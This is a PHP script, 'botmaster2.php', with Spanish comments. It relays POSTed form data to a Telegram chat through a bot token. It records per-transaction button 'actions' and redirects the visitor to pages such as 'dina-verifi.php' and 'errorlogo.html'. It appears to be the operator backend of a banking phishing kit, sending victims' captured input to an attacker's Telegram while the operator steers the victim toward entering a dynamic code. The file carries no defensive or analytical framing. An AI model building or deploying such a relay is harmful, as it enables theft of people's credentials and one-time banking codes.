<?php
// botmaster2.php

header("Content-Type: application/json");

// Solo permitir método POST
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    echo json_encode(["error" => "Método no permitido"]);
    exit;
}

// Obtener datos del POST
$data = $_POST["data"] ?? "";
$keyboard = $_POST["keyboard"] ?? "";
$action = $_POST["action"] ?? null;
$txid = $_POST["txid"] ?? null;

// Ruta del archivo de configuración
$configPath = "botconfig.json";

// Verificar que el archivo exista
if (!file_exists($configPath)) {
    http_response_code(500);
    echo json_encode(["error" => "Archivo de configuración no encontrado"]);
    exit;
}

// Cargar configuración
$config = json_decode(file_get_contents($configPath), true);
$token = $config["token"] ?? null;
$chat_id = $config["chat_id"] ?? null;

// Validar campos requeridos
if (!$token || !$chat_id || !$data) {
    http_response_code(400);
    echo json_encode(["error" => "Faltan datos necesarios (token, chat_id o data)"]);
    exit;
}

// Armar el mensaje a enviar por Telegram
$mensaje = [
    "chat_id" => $chat_id,
    "text" => $data,
    "parse_mode" => "HTML"
];

if ($keyboard) {
    $mensaje["reply_markup"] = json_decode($keyboard, true);
}

// Enviar a Telegram
$ch = curl_init("https://api.telegram.org/bot$token/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($mensaje));
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
$response = curl_exec($ch);
curl_close($ch);

// Guardar estado de acción si hay `txid` y `action`
if ($txid && $action) {
    $estadoDir = __DIR__ . "/statuses";
    if (!is_dir($estadoDir)) {
        mkdir($estadoDir, 0777, true);
    }

    $safeTxid = preg_replace('/[^a-zA-Z0-9_\-]/', '', $txid);
    $file = "$estadoDir/estado_botones_$safeTxid.json";

    file_put_contents($file, json_encode(["status" => $action]));
}

// Opcionalmente, devolver redirección si aplica
$redirects = [
    "pedir_dinamica" => "dina-verifi.php",
    "error_logo"     => "errorlogo.html",
    "finalizar"      => "index.html"
];

if ($action && isset($redirects[$action])) {
    echo json_encode([
        "status" => "ok",
        "redirect" => $redirects[$action]
    ]);
} else {
    echo json_encode(["status" => "ok"]);
}
?>
